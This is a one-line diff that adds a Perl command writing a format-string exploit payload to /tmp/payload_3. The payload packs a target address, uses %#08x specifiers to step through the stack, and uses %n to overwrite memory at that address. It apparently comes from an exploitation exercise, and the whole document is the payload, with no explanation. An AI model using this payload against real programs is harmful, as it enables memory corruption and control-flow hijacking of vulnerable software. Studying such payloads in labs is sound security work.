@@ -1,0 +1,1 @@
+perl -e 'print "\x8c\x98\x04\x08". "%#08x"x3 . "A"x32 . "%n"' > /tmp/payload_3
